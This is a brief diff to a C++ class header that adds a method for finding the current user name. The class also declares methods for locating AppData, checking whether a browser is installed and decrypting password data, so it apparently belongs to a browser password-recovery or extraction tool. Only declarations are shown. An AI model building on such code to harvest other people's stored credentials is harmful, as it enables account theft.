@@ -57,6 +57,7 @@ public:
 
 private:
 	// Methods
+	void					findCurrentUserName();
 	bool					findAppdataPath(std::string &appdataPath);
 	bool					isBrowserInstalled();
 	const char				*uncryptData(BYTE *password, int size);
